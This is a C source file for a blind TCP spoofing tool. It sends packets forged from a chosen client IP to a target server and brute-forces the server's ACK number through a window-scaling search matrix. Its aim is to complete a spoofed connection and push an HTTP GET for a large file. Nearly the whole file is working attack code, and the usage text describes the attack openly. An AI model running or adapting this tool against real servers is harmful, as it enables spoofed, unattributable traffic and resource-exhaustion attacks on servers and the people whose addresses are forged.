#include "tcp_spoof.h"
#include <unistd.h>
#include <getopt.h>
#include <event2/event.h>
#include <error.h>
#include <errno.h>
#include "logger.h"

struct st_state
{
    char *saddr;
    char *daddr;
    int dport;
    int sport;

    int delay;
    int repeat;
    int time;
    uint32_t start_ack;
    int tot_pkts;
    int timeout;
    char *fname;

    // Used for update_ack:
    uint32_t ack_col;
    uint32_t ack_row;    
    uint32_t ack_col_height;
    uint32_t ack_row_width;
    uint32_t cur_window;    // Todo: make these unsigned long long's for extended windows
    uint32_t cur_window_col_sep;    // Because we are trying to shrink from 1024 simultaneous races
                                    // down to ~4, and our window doesn't double this fast,
                                    // we do this by keeping our cur_window the same (since
                                    // we can't send faster than that or some B.S.),
                                    // and increasing cur_window_col_sep while simultaneously
                                    // increasing col_height to maintain constant matrix area
    uint32_t max_window;    
    int ack_between_round;  // True if we are in a transitional round (e.g. 1->2KB window
    int first_round;
    

    uint32_t ack;   // To keep track of the current ACK we are sending
                    // (increments each pkt_cb())
    uint32_t seq;   // specified from command line (or default 0xa1a2a3a5) 
    
    struct pkt_data pkt;    // The actual packet

    char get_request[512];

    // libevent structures
    struct event *pkt_ev;
    struct event *timeout_ev;
};

int get_low_port(char *s)
{
    return atoi(s); 
}

int get_high_port(char *s)
{
    char *high_port = strchr(s, (int)'-');
    if (high_port == NULL) {
        return atoi(s);
    }

    return atoi(high_port+1);
}

char *get_addr(char *addr_port)
{
    char *colon = strchr(addr_port, (int)':');
    if (colon == NULL) {
        return addr_port;
    }

    int addr_len = colon - addr_port;
    if (addr_len > 15) {
        return NULL;
    } 

    char *ret = malloc(addr_len);
    if (ret == NULL) {
        return ret;
    }

    memcpy(ret, addr_port, addr_len);

    return ret; 
}

int get_port(char *addr_port)
{
    char *colon = strchr(addr_port, (int)':');
    if (colon == NULL) {
        return -1;
    }

    return atoi(colon + 1);
}

int timediff_us(struct timeval *t1, struct timeval *t2)
{
    return (t2->tv_sec - t1->tv_sec)*1000000 +
        (t2->tv_usec - t1->tv_usec);
}

void delay_until(struct timeval *last_time, int delay)
{
    struct timeval cur_time;
    gettimeofday(&cur_time, NULL);
    int diff;
    while ((diff = timediff_us(last_time, &cur_time)) < delay) {
        if ((delay - diff) > 50) {
            usleep(delay - diff - 50);
        }
        gettimeofday(&cur_time, NULL);
    }
    gettimeofday(last_time, NULL);
}


void timeout_cb(evutil_socket_t fd, short what, void *arg)
{
    struct st_state *state;
    state = (struct st_state*)arg;

    state->pkt.ack = 0;
    tcp_forge_xmit(&state->pkt, state->get_request, strlen(state->get_request));

    state->pkt.ack = 2147483649; // 2**31 +1 
    tcp_forge_xmit(&state->pkt, state->get_request, strlen(state->get_request));

    state->seq += strlen(state->get_request);
    state->pkt.seq = state->seq;

    //printf("timeout\n");
    LogInfo("timeout", "sequence 0x%08x", state->pkt.seq); 
}


void update_ack(struct st_state *state)
{ 
    //state->ack += 1024; 
    uint32_t next_ack;
    uint32_t row_add;

    // -> + 1MB, 2MB, 3MB, etc... 
    next_ack = state->ack_col * state->ack_col_height * state->cur_window;
    
    // |
    // v + 1KB, 2KB, 3KB, 4KB, etc...
    row_add = state->ack_row * state->cur_window;

    next_ack += row_add;

    if (state->ack_between_round && ((state->ack_col % 2) == 0)) {
        // Add a second one if we are in the transition 
        // between window sizes for every other column.
        // This allows us to "catch up" with the column to our right
        // by the end of this round, and the next round, cut the number
        // of columns in half.
        next_ack += row_add;
    }

    if (state->first_round > 0) {
        state->first_round--;
        LogInfo("ack", " (%d, %d)_%d = %d (%d col sep, %d trans)", 
                state->ack_col, state->ack_row, state->cur_window,
                next_ack, state->cur_window_col_sep, state->ack_between_round);
    }

    if (state->ack_col == 0 && state->first_round <= 0 && state->first_round > -4) {
        state->first_round--;
        LogInfo("ack", "(%d, %d)_%d = %d (%d col sep, %d trans)", 
                state->ack_col, state->ack_row, state->cur_window,
                next_ack, state->cur_window_col_sep, state->ack_between_round);
    }
        

    // Advance and check for wrap
    state->ack_col++;
    if (state->ack_col == state->ack_row_width) {
        state->ack_col = 0;

        // Advance the row, check for wrap
        state->ack_row++;
        if (state->ack_row == state->ack_col_height) {
            // End of this round/window size
            state->ack_row = 0;
            state->first_round = 4;

            LogInfo("state", "finished window %d%s", state->cur_window, 
                    state->ack_between_round ? " (transition)" : "");

            if (state->ack_between_round) {
                // We have transitioned to the next round
                state->ack_between_round = 0;

                if (state->ack_row_width > 4) {
                    state->ack_row_width /= 2;
                    //state->cur_window_col_sep *= 2;
                    LogInfo("state", "decreasing row width to %d", state->ack_row_width);

                    if (state->cur_window >= state->max_window) {
                        state->ack_col_height *= 2;
                    }
                    LogInfo("state", "col_height: %d window_col_sep %d", state->ack_col_height, 
                            state->cur_window_col_sep);
                }

                if (state->cur_window < state->max_window) {
                    state->cur_window *= 2;
                    LogInfo("state", "increasing window to %d", state->cur_window);

                    // We can also send packets twice as slow now
                    state->delay *= 2;

                    struct timeval tv = {0, state->delay};
                    evtimer_del(state->pkt_ev);
                    evtimer_add(state->pkt_ev, &tv); 
                    LogInfo("state", "increasing delay to %d us", state->delay);
    
                    if (state->timeout > 1) {
                        if (state->timeout > 3) {
                            state->timeout -= 3;
                        } else {
                            state->timeout--;
                        }
                        struct timeval tv2 = {state->timeout, 0};
                        evtimer_del(state->timeout_ev);
                        evtimer_add(state->timeout_ev, &tv2);

                        LogInfo("state", "decreasing timeout to %d seconds", state->timeout);
                    }
                } 

            } else {
                // We are now in a transitional round; don't change sizes yet
                state->ack_between_round = 1;   
            } 
        }
    }
    
    state->ack = next_ack;
}


/* Send ~4Million acks every 60 seconds */
void pkt_cb(evutil_socket_t fd, short what, void *arg)
{
    struct st_state *state;
    state = (struct st_state*)arg;

    state->pkt.ack = state->ack;
    update_ack(state);

    tcp_forge_xmit(&state->pkt, NULL, 0);    
}



void print_usage(char *prog)
{
    printf("\nUsage: %s [options] client_ip server_ip:server_port\n\n", prog);
    printf("\tSends a SYN packet spoofed from client_ip to server_ip:server_port,\n");
    printf("\tThen attempts to guess the ACK field to complete the \"connection\".\n\n");
    printf("Options:\n");
    printf("    --file (-f)   : filename of large file on server (default large_file.dat)\n");
    printf("    --delay (-d)  : microseconds to delay between each send\n");
    printf("    --timeout (-T): timeout in seconds for server's TCP connection (default 60)\n");
    printf("    --repeat (-r) : number of times to loop. 0 for inifinite\n");
    printf("    --time (-t)   : time (in milliseconds) to run for. Overrides -r.\n");
    printf("    --ack (-a)    : start acknowledgement (default 0)\n");
    printf("    --sport (-s)  : source port (default 11111)\n");
    printf("    --seq (-S)    : sequence number (default 0xa1a2a3a5)\n");
    printf("\n");
}

int main(int argc, char *argv[])
{
    int dport_begin, dport_end;
    struct timeval last_time;
    int opt; // opt_ind;
    int opt_index;
    struct option long_opts[] = {
        {"file", 1, 0, 'f'},
        {"delay", 1, 0, 'd'},
        {"timeout", 1, 0, 'T'},
        {"repeat", 1, 0, 'r'},
        {"time", 1, 0, 't'},
        {"ack", 1, 0, 'a'},
        {"sport", 1, 0, 's'},
        {"seq", 1, 0, 'S'},
        {"count", 1, 0, 'c'},
        {0, 0, 0, 0}
    };

    struct st_state state;
    memset(&state, 0, sizeof(state));

    char *saddr;
    char *daddr_port;
    char *daddr;
    int dport;

    // defaults
    state.delay = 16;
    state.repeat = 1;
    state.sport = 11111;
    state.seq = 0xa1a2a3a5;
    state.time = 0;
    state.start_ack = 0;
    state.tot_pkts = -1;
    state.timeout = 8;
    state.fname = "large_file.dat";

    // Update_ack defaults
    state.ack_col_height = 2048;
    state.ack_row_width = 2048;
    state.cur_window = 1024;
    state.cur_window_col_sep = state.cur_window;
    state.max_window = 8192;    // Wish this were larger :/
    state.ack_between_round = 0;
    state.first_round = 4;

    while ((opt = getopt_long(argc, argv, "f:d:T:r:t:a:c:s:S:", long_opts, &opt_index)) != -1) {
        switch (opt) {
        case 'f':
            state.fname = optarg;
            break;
        case 'd':
            state.delay = atoi(optarg);
            break;
        case 'T':
            state.timeout = atoi(optarg);
            break;
        case 'r':
            state.repeat = atoi(optarg);
            if (state.repeat == 0)
                state.repeat = -1;
            break;
        case 't':
            state.time = atoi(optarg);
            break;
        case 'a':
            state.start_ack = atoi(optarg);
            break;
        case 'c':
            state.tot_pkts = atoi(optarg);
            break;
        case 's':
            state.sport = atoi(optarg);
            break;
        case 'S':
            state.seq = atoi(optarg);
            break;
        default:
            print_usage(argv[0]);
        }
    }


    if (state.time != 0) {
        state.repeat = -1;
    }

    if (optind+2 != argc) {
        //usage
        print_usage(argv[0]);
        return -1;
    } 

    state.saddr = argv[optind++];
    daddr_port = argv[optind++];   // site_ip:site_port

    state.daddr = get_addr(daddr_port);
    state.dport = get_port(daddr_port);

    /*
    printf("saddr: [%s]\n", saddr);
    printf("sport: [%d]\n", sport_low);
    printf("daddr: [%s]\n", daddr);
    printf("dport: [%d]\n", dport);
    */
 
    init_sock();

    state.pkt.daddr = inet_addr(state.daddr);
    state.pkt.saddr = inet_addr(state.saddr);
    state.pkt.dport = htons(state.dport);
    //pkt.sport = (uint16_t)(rand() & 0xffff);
    state.pkt.sport = htons(state.sport);
    
    state.pkt.id = 1234;
    state.pkt.ttl = 64;

    state.pkt.window = 65535;

    state.pkt.ack = state.start_ack;
    state.pkt.seq = state.seq;

    state.pkt.flags = TH_ACK;

    snprintf(state.get_request, sizeof(state.get_request),
             "GET /%s HTTP/1.1\nHost: %s\n\n", state.fname, state.daddr);

    //tcp_forge_xmit(&state.pkt, NULL, 0);


    // Init LibEvent
    struct event_base *base;

    base = event_base_new();
    if (!base) {
        printf("Error: could not init Libevent\n");
        return -1;
    }

    struct timeval timeout_tv = { 8, 0 };
    state.timeout_ev = event_new(base, -1, EV_PERSIST, timeout_cb, &state);
    evtimer_add(state.timeout_ev, &timeout_tv);

    struct timeval pkt_tv = { 0, state.delay};
    state.pkt_ev = event_new(base, -1, EV_PERSIST, pkt_cb, &state);
    evtimer_add(state.pkt_ev, &pkt_tv);
    
    LogOutputStream(stdout);
    LogInfo("main", "launching...");
   
    // Start off with some data
    timeout_cb(-1, 0, &state);

    event_base_dispatch(base); 
    

    // Now we'll guess the ACK
    //pkt.seq = htonl(ntohl(pkt.seq) + 1);
/*
    pkt.seq++;
    pkt.flags = TH_ACK;


    uint32_t ack;

    do {

        for (ack=start_ack; ack!=(start_ack-1) && tot_pkts; ack++) {


            if ((ack % 0x0fffff) == 0) {
                pkt.flags = TH_SYN;
                pkt.seq--;
                tcp_forge_xmit(&pkt, NULL, 0);
                pkt.seq++;
                pkt.flags = TH_ACK;
            }

rerun:
            delay_until(&last_time, delay);

            //pkt.ack = htonl(ack);
            pkt.ack = ack;
            
            if (tcp_forge_xmit(&pkt, NULL, 0)) {
                fprintf(stderr, "noo\n");
                return -1;
            }
            if (tot_pkts != -1)
                tot_pkts--;
        }

        if (repeat > 0)
            repeat--;

        if (repeat == 0)
            break;
        if (time != 0) {
            struct timeval cur_time;
            gettimeofday(&cur_time, NULL);
            if ((cur_time.tv_sec > end_time.tv_sec) ||
             (cur_time.tv_sec == end_time.tv_sec && cur_time.tv_usec > end_time.tv_usec)) {
                break;
            }
        } 
    } while (1);
*/
    return 0;    
}
